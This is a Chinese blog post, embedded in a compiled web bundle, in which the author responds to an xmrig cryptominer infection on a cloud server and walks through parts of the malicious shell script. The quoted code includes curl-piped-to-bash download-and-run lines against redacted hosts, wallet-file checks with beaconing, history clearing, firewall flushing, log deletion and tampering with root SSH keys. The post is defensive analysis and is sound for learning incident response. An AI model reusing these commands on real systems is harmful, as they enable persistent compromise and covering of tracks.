import{_ as n}from"./plugin-vue_export-helper-DlAUqK2U.js";import{c as a,a as i,o as e}from"./app-BiQR_lPj.js";const l={};function p(c,s){return e(),a("div",null,s[0]||(s[0]=[i(`<h1 id="_20230817-阿里云美国某服务器被挂挖矿恶意软件的解决方法-分析恶意脚本" tabindex="-1"><a class="header-anchor" href="#_20230817-阿里云美国某服务器被挂挖矿恶意软件的解决方法-分析恶意脚本"><span>20230817-阿里云美国某服务器被挂挖矿恶意软件的解决方法，分析恶意脚本</span></a></h1><h2 id="报警短信" tabindex="-1"><a class="header-anchor" href="#报警短信"><span>报警短信</span></a></h2><p>凌晨收到告警短信，爬起来解决问题先。</p><div class="language- line-numbers-mode" data-highlighter="shiki" data-ext="" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34;"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code class="language-"><span class="line"><span>【某里云】尊敬的XXXX - XXXX ,云监控-云服务器ECS&lt;美西-XXX-XXX-XXX/XXX.XXX.XXX.XXX&gt;于&lt;2023-08-17 02:17:32&gt;发生报警，(Agent)cpu.total（99.78%&gt;=80%），持续时间0分钟</span></span></code></pre><div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0;"><div class="line-number"></div></div></div><h2 id="ssh远程进入系统" tabindex="-1"><a class="header-anchor" href="#ssh远程进入系统"><span>SSH远程进入系统</span></a></h2><p>查看原因</p><div class="language- line-numbers-mode" data-highlighter="shiki" data-ext="" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34;"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code class="language-"><span class="line"><span>top查看负载</span></span>
<span class="line"><span>有一个熟悉有陌生的进程 xmrig 挖矿软件</span></span>
<span class="line"><span></span></span>
<span class="line"><span># ps aux |grep xmrig</span></span>
<span class="line"><span>/etc/.system/php/xmrig --config=/etc/.system/php/config.json </span></span>
<span class="line"><span></span></span>
<span class="line"><span>kill掉进程</span></span>
<span class="line"><span>进程杀不到，杀了又启动一个</span></span>
<span class="line"><span></span></span>
<span class="line"><span>于是删除目录： </span></span>
<span class="line"><span>rm -rf /etc/.system/</span></span>
<span class="line"><span>再杀进程，发现进程没有了，</span></span>
<span class="line"><span>不出意外过几分钟可能会再次启动的。</span></span></code></pre><div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0;"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><p>判断服务器是被挂了挖矿的恶意软件！</p><p><img src="https://imgoss.xgss.net/picgo/bingdu-ecs-guama.jpg?aliyun" alt="bingdu-ecs-guama"></p><h2 id="查看定时任务" tabindex="-1"><a class="header-anchor" href="#查看定时任务"><span>查看定时任务</span></a></h2><div class="language- line-numbers-mode" data-highlighter="shiki" data-ext="" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34;"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code class="language-"><span class="line"><span>ll /etc/crontab</span></span>
<span class="line"><span>-rw-r--r-- 1 root root 151 May 15  2018 /etc/crontab</span></span>
<span class="line"><span></span></span>
<span class="line"><span>cat /etc/crontab</span></span>
<span class="line"><span>*/30 * * * * root curl -fsSL http://XXX.XXX.XXX.XXX/php/php_8020.sh | bash </span></span>
<span class="line"><span>*/30 * * * * root cd1 -fsSL http://XXX.XXX.XXX.XXX/php/php_8020.sh | bash </span></span>
<span class="line"><span></span></span>
<span class="line"><span>ll /etc/cron</span></span>
<span class="line"><span>cron.d/       cron.daily/   cron.deny     cron.hourly/  cron.monthly/ crontab       crontab~      crontaz~      cron.weekly/  </span></span>
<span class="line"><span></span></span>
<span class="line"><span>刻意的文件有</span></span>
<span class="line"><span>crontab       crontab~      crontaz~ </span></span>
<span class="line"><span>文件内容都是 每30分钟从 某个IP中下载一个恶意脚本并且执行</span></span></code></pre><div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0;"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><h3 id="无法编辑" tabindex="-1"><a class="header-anchor" href="#无法编辑"><span>无法编辑</span></a></h3><div class="language- line-numbers-mode" data-highlighter="shiki" data-ext="" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34;"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code class="language-"><span class="line"><span>chmod 777 -R /etc/crontab</span></span>
<span class="line"><span>chmod: changing permissions of ‘/etc/crontab’: Operation not permitted</span></span>
<span class="line"><span>vi /etc/crontab 也没有权限</span></span></code></pre><div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0;"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><p>解决：</p><div class="language- line-numbers-mode" data-highlighter="shiki" data-ext="" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34;"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code class="language-"><span class="line"><span></span></span>
<span class="line"><span>chattr -ia /var/spool/cron</span></span>
<span class="line"><span>chattr -ia /etc/crontab</span></span>
<span class="line"><span></span></span>
<span class="line"><span>vi /etc/crontab</span></span>
<span class="line"><span>rm -rf   /etc/crontab~</span></span>
<span class="line"><span>rm -rf /etc/crontaz~</span></span>
<span class="line"><span>systemctl restart crond</span></span></code></pre><div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0;"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><h2 id="去掉远程密钥登录" tabindex="-1"><a class="header-anchor" href="#去掉远程密钥登录"><span>去掉远程密钥登录</span></a></h2><div class="language- line-numbers-mode" data-highlighter="shiki" data-ext="" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34;"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code class="language-"><span class="line"><span># netstat -tunpl|grep ssh</span></span>
<span class="line"><span>tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN      28838/sshd          </span></span>
<span class="line"><span>tcp        0      0 0.0.0.0:11222           0.0.0.0:*               LISTEN      28838/sshd          </span></span>
<span class="line"><span>tcp        0      0 0.0.0.0:XXXX           0.0.0.0:*               LISTEN      28838/sshd     本机正在的ssh</span></span></code></pre><div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0;"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><div class="language- line-numbers-mode" data-highlighter="shiki" data-ext="" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34;"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code class="language-"><span class="line"><span></span></span>
<span class="line"><span>chattr -ia /etc/ssh/sshd_config </span></span>
<span class="line"><span>编辑</span></span>
<span class="line"><span>vi /etc/ssh/sshd_config </span></span>
<span class="line"><span>把恶意的端口22和11222 关闭掉</span></span>
<span class="line"><span>vi /etc/ssh/sshd_config</span></span>
<span class="line"><span>systemctl restart sshd </span></span>
<span class="line"><span></span></span>
<span class="line"><span># netstat -tunpl|grep ssh</span></span>
<span class="line"><span>tcp        0      0 0.0.0.0:60920           0.0.0.0:*               LISTEN      1214/sshd</span></span></code></pre><div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0;"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><h2 id="在某云控制台中设置安全组只运行自己的ip登录ssh" tabindex="-1"><a class="header-anchor" href="#在某云控制台中设置安全组只运行自己的ip登录ssh"><span>在某云控制台中设置安全组只运行自己的ip登录SSH</span></a></h2><p><img src="https://imgoss.xgss.net/picgo/image-20230817101528002.png?aliyun" alt="image-20230817101528002"></p><p>保证其他人无法登录ssh</p><h1 id="下载恶意代码分析" tabindex="-1"><a class="header-anchor" href="#下载恶意代码分析"><span>下载恶意代码分析</span></a></h1><p>下载恶意脚本的代码，看一下如何解决这个问题，一段一段的来分析是怎么挂马的</p><h2 id="_1-修改-resolv-conf文件" tabindex="-1"><a class="header-anchor" href="#_1-修改-resolv-conf文件"><span>1.修改 resolv.conf文件</span></a></h2><div class="language- line-numbers-mode" data-highlighter="shiki" data-ext="" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34;"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code class="language-"><span class="line"><span>于是我决定下载 http://XXX.XXX.XXX.XXX/php/php_8020.sh 然后分析一下</span></span></code></pre><div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0;"><div class="line-number"></div></div></div><h3 id="恶意代码" tabindex="-1"><a class="header-anchor" href="#恶意代码"><span>恶意代码：</span></a></h3><div class="language- line-numbers-mode" data-highlighter="shiki" data-ext="" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34;"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code class="language-"><span class="line"><span>#!/bin/bash -e</span></span>
<span class="line"><span></span></span>
<span class="line"><span>VERSION=22.06</span></span>
<span class="line"><span>ulimit -n 65535 </span></span>
<span class="line"><span>function SetupNameServers(){  </span></span>
<span class="line"><span>grep -q 8.8.8.8 /etc/resolv.conf || \${CHATTR} -i /etc/resolv.conf 2&gt;/dev/null 1&gt;/dev/null; tntrecht -i /etc/resolv.conf 2&gt;/dev/null 1&gt;/dev/null; echo &quot;nameserver 8.8.8.8&quot; &gt;&gt; /etc/resolv.conf; \${CHATTR} +i /etc/resolv.conf 2&gt;/dev/null 1&gt;/dev/null; tntrecht +i /etc/resolv.conf 2&gt;/dev/null 1&gt;/dev/null</span></span>
<span class="line"><span>grep -q 8.8.4.4 /etc/resolv.conf || \${CHATTR} -i /etc/resolv.conf 2&gt;/dev/null 1&gt;/dev/null; tntrecht -i /etc/resolv.conf 2&gt;/dev/null 1&gt;/dev/null; echo &quot;nameserver 8.8.4.4&quot; &gt;&gt; /etc/resolv.conf; \${CHATTR} +i /etc/resolv.conf 2&gt;/dev/null 1&gt;/dev/null; tntrecht +i /etc/resolv.conf 2&gt;/dev/null 1&gt;/dev/null</span></span>
<span class="line"><span>}</span></span>
<span class="line"><span>SetupNameServers</span></span>
<span class="line"><span></span></span>
<span class="line"><span>修改dns</span></span></code></pre><div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0;"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><h3 id="解决" tabindex="-1"><a class="header-anchor" href="#解决"><span>解决</span></a></h3><div class="language- line-numbers-mode" data-highlighter="shiki" data-ext="" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34;"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code class="language-"><span class="line"><span>vi  /etc/resolv.conf</span></span>
<span class="line"><span>options timeout:2 attempts:3 rotate single-request-reopen</span></span>
<span class="line"><span>; generated by /usr/sbin/dhclient-script</span></span>
<span class="line"><span>nameserver 100.100.2.136</span></span>
<span class="line"><span>nameserver 100.100.2.138</span></span>
<span class="line"><span>nameserver 8.8.8.8</span></span>
<span class="line"><span>nameserver 8.8.4.4</span></span>
<span class="line"><span>nameserver 8.8.8.8</span></span>
<span class="line"><span>nameserver 8.8.4.4</span></span>
<span class="line"><span>nameserver 8.8.8.8</span></span>
<span class="line"><span>nameserver 8.8.4.4</span></span>
<span class="line"><span>nameserver 8.8.8.8</span></span>
<span class="line"><span>nameserver 8.8.4.4</span></span>
<span class="line"><span>nameserver 8.8.8.8</span></span>
<span class="line"><span>nameserver 8.8.4.4</span></span>
<span class="line"><span>nameserver 8.8.8.8</span></span>
<span class="line"><span>nameserver 8.8.4.4</span></span>
<span class="line"><span>nameserver 8.8.8.8</span></span>
<span class="line"><span>nameserver 8.8.4.4</span></span>
<span class="line"><span>nameserver 8.8.8.8</span></span>
<span class="line"><span>nameserver 8.8.4.4</span></span>
<span class="line"><span>nameserver 8.8.8.8</span></span>
<span class="line"><span>nameserver 8.8.4.4</span></span>
<span class="line"><span>nameserver 8.8.8.8</span></span>
<span class="line"><span>nameserver 8.8.4.4</span></span>
<span class="line"><span>nameserver 8.8.8.8</span></span>
<span class="line"><span>nameserver 8.8.4.4</span></span>
<span class="line"><span>nameserver 8.8.8.8</span></span>
<span class="line"><span>nameserver 8.8.4.4</span></span>
<span class="line"><span>nameserver 8.8.8.8</span></span>
<span class="line"><span>nameserver 8.8.4.4</span></span>
<span class="line"><span>nameserver 8.8.8.8</span></span>
<span class="line"><span>nameserver 8.8.4.4</span></span>
<span class="line"><span>nameserver 8.8.8.8</span></span>
<span class="line"><span>nameserver 8.8.4.4</span></span>
<span class="line"><span>nameserver 8.8.8.8</span></span>
<span class="line"><span>nameserver 8.8.4.4</span></span>
<span class="line"><span>把文件改成</span></span>
<span class="line"><span>vi  /etc/resolv.conf</span></span>
<span class="line"><span>options timeout:2 attempts:3 rotate single-request-reopen</span></span>
<span class="line"><span>; generated by /usr/sbin/dhclient-script</span></span>
<span class="line"><span>nameserver 100.100.2.136</span></span>
<span class="line"><span>nameserver 100.100.2.138</span></span></code></pre><div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0;"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><h2 id="_2-搜索关键字" tabindex="-1"><a class="header-anchor" href="#_2-搜索关键字"><span>2.搜索关键字</span></a></h2><h3 id="恶意代码-1" tabindex="-1"><a class="header-anchor" href="#恶意代码-1"><span>恶意代码：</span></a></h3><div class="language- line-numbers-mode" data-highlighter="shiki" data-ext="" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34;"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code class="language-"><span class="line"><span>if [ -f ~/ /home -maxdepth 6 -name &#39;trc20usdt&#39; ] # 它在指定的目录（~ 或 /home）下搜索名为 &#39;trc20usdt&#39; 的文件，并且搜索的深度不超过 6 层子目录。如果找到了符合条件的文件，条件将被视为满足，对应的代码块将会执行。</span></span>
<span class="line"><span>  then</span></span>
<span class="line"><span>    echo &quot;Crypto running&quot;</span></span>
<span class="line"><span>    curl 6nj0me.XXXX.io  # 上报地址做了修改。</span></span>
<span class="line"><span>    curl -fsSL http://XX.XX.XX.XX/php/php.sh | bash </span></span>
<span class="line"><span>  elif [ -f ~/ /home -maxdepth 6 -name &#39;TronWeb&#39; ]</span></span>
<span class="line"><span>    then</span></span>
<span class="line"><span>      echo &quot;Crypto running&quot;</span></span>
<span class="line"><span>      curl 6nj0me.XXX.io # 地址做了修改</span></span>
<span class="line"><span>      curl -fsSL http://XX.XX.XX.XX/php/php.sh | bash </span></span>
<span class="line"><span>      history -c </span></span>
<span class="line"><span>      </span></span>
<span class="line"><span>  elif [ -f ~/ /home -maxdepth 6 -name &#39;hdkey&#39; ]</span></span>
<span class="line"><span>    then</span></span>
<span class="line"><span>      echo &quot;Crypto running&quot;</span></span>
<span class="line"><span>      curl 6nj0me.xxx.io</span></span>
<span class="line"><span>      curl -fsSL http://XX.XX.XX.XX/php/php.sh | bash </span></span>
<span class="line"><span>      history -c </span></span>
<span class="line"><span>      </span></span>
<span class="line"><span>  elif [ -f ~/ /home -maxdepth 6 -name &#39;ethers&#39; ]</span></span>
<span class="line"><span>    then</span></span>
<span class="line"><span>      echo &quot;Crypto running&quot;</span></span>
<span class="line"><span>      curl 6nj0me.xxx.io</span></span>
<span class="line"><span>      curl -fsSL http://XX.XX.XX.XX/php/php.sh | bash </span></span>
<span class="line"><span>      history -c </span></span>
<span class="line"><span>      </span></span>
<span class="line"><span>  elif [ -f ~/ /home -maxdepth 6 -name &#39;web3&#39; ]</span></span>
<span class="line"><span>    then</span></span>
<span class="line"><span>      echo &quot;Crypto running&quot;</span></span>
<span class="line"><span>      curl 6nj0me.xxx.io</span></span>
<span class="line"><span>      curl -fsSL http://XX.XX.XX.XX/php/php.sh | bash </span></span>
<span class="line"><span>      history -c </span></span>
<span class="line"><span>      </span></span>
<span class="line"><span>  elif [ -f ~/ /home -maxdepth 6 -name &#39;wormhole&#39; ]</span></span>
<span class="line"><span>    then</span></span>
<span class="line"><span>      echo &quot;Crypto running&quot;</span></span>
<span class="line"><span>      curl 6nj0me.xxx.io</span></span>
<span class="line"><span>      curl -fsSL http://XX.XX.XX.XX/php/php.sh | bash </span></span>
<span class="line"><span>      history -c </span></span>
<span class="line"><span>      </span></span>
<span class="line"><span>  elif [ -f ~/ /home -maxdepth 6 -name &#39;bitcoin&#39; ]</span></span>
<span class="line"><span>    then</span></span>
<span class="line"><span>      echo &quot;Crypto running&quot;</span></span>
<span class="line"><span>      curl 6nj0me.xxx.io</span></span>
<span class="line"><span>      curl -fsSL http://XX.XX.XX.XX/php/php.sh | bash </span></span>
<span class="line"><span>      history -c </span></span>
<span class="line"><span>      </span></span>
<span class="line"><span>  elif [ -f ~/ /home -maxdepth 6 -name &#39;binance&#39; ]</span></span>
<span class="line"><span>    then</span></span>
<span class="line"><span>      echo &quot;Crypto running&quot;</span></span>
<span class="line"><span>      curl 6nj0me.xxx.io</span></span>
<span class="line"><span>      curl -fsSL http://XX.XX.XX.XX/php/php.sh | bash </span></span>
<span class="line"><span>      history -c </span></span>
<span class="line"><span>      </span></span>
<span class="line"><span>  elif [ -f ~/ /home -maxdepth 6 -name &#39;ethereum&#39; ]</span></span>
<span class="line"><span>    then</span></span>
<span class="line"><span>      echo &quot;Crypto running&quot;</span></span>
<span class="line"><span>      curl 6nj0me.xxx.io</span></span>
<span class="line"><span>      curl -fsSL http://XX.XX.XX.XX/php/php.sh | bash </span></span>
<span class="line"><span>      history -c </span></span>
<span class="line"><span>      </span></span>
<span class="line"><span>  elif [ -f ~/ /home -maxdepth 6 -name &#39;hdwallet&#39; ]</span></span>
<span class="line"><span>    then</span></span>
<span class="line"><span>      echo &quot;Crypto running&quot;</span></span>
<span class="line"><span>      curl 6nj0me.xxx.io</span></span>
<span class="line"><span>      curl -fsSL http://XX.XX.XX.XX/php/php.sh | bash </span></span>
<span class="line"><span>      history -c </span></span>
<span class="line"><span>      </span></span>
<span class="line"><span>  else</span></span>
<span class="line"><span>      echo &quot;not Crypto running &quot;</span></span>
<span class="line"><span>fi</span></span></code></pre><div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0;"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><h3 id="恶意代码分析" tabindex="-1"><a class="header-anchor" href="#恶意代码分析"><span>恶意代码分析</span></a></h3><div class="language- line-numbers-mode" data-highlighter="shiki" data-ext="" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34;"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code class="language-"><span class="line"><span>这段代码是一个 Bash 脚本，用于检测系统中是否存在一系列文件，并根据文件的存在与否执行相应的操作。脚本的大致逻辑如下：</span></span>
<span class="line"><span></span></span>
<span class="line"><span>1. 首先，通过一系列条件判断检查系统中是否存在特定的文件（文件名），这些文件名都与加密货币相关。</span></span>
<span class="line"><span>2. 如果找到其中一个文件，表示系统中可能正在运行加密货币软件，脚本会输出 &quot;Crypto running&quot;，然后执行以下操作：</span></span>
<span class="line"><span>   - 向 \`6nj0me.xxx.io\` 发送请求（可能用于跟踪感染的主机）。</span></span>
<span class="line"><span>   - 从 \`http://XX.XX.XX.XX/php/php.sh\` 下载一个 PHP 脚本，并执行它（可能用于安装恶意软件或挖矿程序）。</span></span>
<span class="line"><span>   - 清除命令历史记录，使用 \`history -c\` 命令删除执行过的命令记录，以尽量隐藏操作。</span></span>
<span class="line"><span>3. 如果没有找到上述任何文件，脚本会输出 &quot;not Crypto running&quot;。</span></span>
<span class="line"><span></span></span>
<span class="line"><span>需要注意的是，这段代码的意图看起来是在检查系统中是否存在特定的文件，如果存在，则执行一些恶意操作。这可能是一种恶意软件或入侵活动。如果你发现类似的代码在你的系统上运行，强烈建议立即采取行动，清除恶意脚本，并采取措施来保护你的系统。如果不确定如何处理，请寻求专业的技术支持。</span></span></code></pre><div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0;"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><h3 id="解决-1" tabindex="-1"><a class="header-anchor" href="#解决-1"><span>解决</span></a></h3><div class="language- line-numbers-mode" data-highlighter="shiki" data-ext="" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34;"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code class="language-"><span class="line"><span>find /home -maxdepth 6 -name &#39;trc20usdt&#39;</span></span>
<span class="line"><span>find / -maxdepth 6 -name &#39;trc20usdt&#39;</span></span>
<span class="line"><span>find /  -maxdepth 6 -name &#39;ethers&#39;</span></span>
<span class="line"><span></span></span>
<span class="line"><span>...</span></span>
<span class="line"><span>搜索不到什么。</span></span></code></pre><div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0;"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><h2 id="_3-判断xmrig-log" tabindex="-1"><a class="header-anchor" href="#_3-判断xmrig-log"><span>3.判断xmrig.log</span></a></h2><h3 id="恶意代码-2" tabindex="-1"><a class="header-anchor" href="#恶意代码-2"><span>恶意代码：</span></a></h3><div class="language- line-numbers-mode" data-highlighter="shiki" data-ext="" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34;"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code class="language-"><span class="line"><span>if [ -f &quot;/etc/.system/php/xmrig.log&quot; ]</span></span>
<span class="line"><span>then</span></span>
<span class="line"><span>    echo &quot;process possible running&quot;</span></span>
<span class="line"><span>    current=$(date +%s)</span></span>
<span class="line"><span>    last_modified=$(stat -c &quot;%Y&quot; /etc/.system/php/xmrig.log)</span></span>
<span class="line"><span>   if [ $(($current-$last_modified)) -gt 600 ]; then</span></span>
<span class="line"><span>        echo &quot;no rr process running&quot;;</span></span>
<span class="line"><span>    else</span></span>
<span class="line"><span>    echo &quot;rr process running&quot;</span></span>
<span class="line"><span>    exit 1</span></span>
<span class="line"><span>   fi</span></span>
<span class="line"><span>else </span></span>
<span class="line"><span>    echo &quot;rr process not running&quot;</span></span>
<span class="line"><span>fi</span></span>
<span class="line"><span></span></span>
<span class="line"><span>解释：</span></span>
<span class="line"><span>这段代码用于检查一个特定的日志文件是否存在，然后检查该文件的上次修改时间，如果文件的上次修改时间超过10分钟，脚本会打印 &quot;no rr process running&quot;，表示未发现 &quot;rr&quot; 进程正在运行。如果文件的上次修改时间在10分钟之内，脚本会打印 &quot;rr process running&quot;，并退出脚本。如果文件不存在，则脚本会打印 &quot;rr process not running&quot;。</span></span></code></pre><div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0;"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><h2 id="_4-iptables-f" tabindex="-1"><a class="header-anchor" href="#_4-iptables-f"><span>4.iptables -F</span></a></h2><p>当你运行 iptables -F 命令时，它会清空（删除）当前已经定义的所有规则，恢复防火墙到初始状态。这将导致系统的防火墙规则被移除，网络流量将不再受到任何防火墙规则的限制。换句话说，所有之前定义的规则都将被删除，允许所有的网络流量自由通过。</p><h3 id="恶意代码-3" tabindex="-1"><a class="header-anchor" href="#恶意代码-3"><span>恶意代码</span></a></h3><div class="language- line-numbers-mode" data-highlighter="shiki" data-ext="" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34;"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code class="language-"><span class="line"><span>iptables -F</span></span></code></pre><div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0;"><div class="line-number"></div></div></div><h2 id="_5-关闭防火墙和安全软件等" tabindex="-1"><a class="header-anchor" href="#_5-关闭防火墙和安全软件等"><span>5.关闭防火墙和安全软件等</span></a></h2><h3 id="恶意代码-4" tabindex="-1"><a class="header-anchor" href="#恶意代码-4"><span>恶意代码</span></a></h3><div class="language- line-numbers-mode" data-highlighter="shiki" data-ext="" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34;"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code class="language-"><span class="line"><span>export RRHOME=/etc/.system/php</span></span>
<span class="line"><span>rm -rf $RRHOME</span></span>
<span class="line"><span>mkdir $RRHOME -p</span></span>
<span class="line"><span></span></span>
<span class="line"><span>rm -rf /var/log/syslog</span></span>
<span class="line"><span>chattr -iua /tmp/     # 允许对 /tmp/ 目录进行修改、更新和追加操作</span></span>
<span class="line"><span>chattr -iua /var/tmp/ # 使用 chattr 命令修改 /var/tmp/ 目录的属性，取消不可修改、不可更新和不可追加属性。</span></span>
<span class="line"><span>ufw disable #  关闭Ubuntu的防火墙， Uncomplicated Firewall（UFW），这是一个用于配置 iptables 防火墙规则的前端工具。</span></span>
<span class="line"><span>iptables -F  # iptables -F是用于清除所有的防火墙规则和计数器，即将所有的iptables规则设置为默认值，从而可以清空当前的防火墙策略。</span></span>
<span class="line"><span>sudo sysctl kernel.nmi_watchdog=0</span></span>
<span class="line"><span>sysctl kernel.nmi_watchdog=0</span></span>
<span class="line"><span>echo &#39;0&#39; &gt; /proc/sys/kernel/nmi_watchdog</span></span>
<span class="line"><span>echo &#39;kernel.nmi_watchdog=0&#39; &gt;&gt;/etc/sysctl.conf</span></span>
<span class="line"><span>这一系列操作似乎是用于禁用 NMI（Non-Maskable Interrupt）看门狗，在某些情况下可以防止系统被死锁等问题影响。</span></span>
<span class="line"><span></span></span>
<span class="line"><span>chattr -iae /root/.ssh/</span></span>
<span class="line"><span>chattr -iae /root/.ssh/authorized_keys</span></span>
<span class="line"><span>rm -rf /tmp/addres*</span></span>
<span class="line"><span>rm -rf /tmp/walle*</span></span>
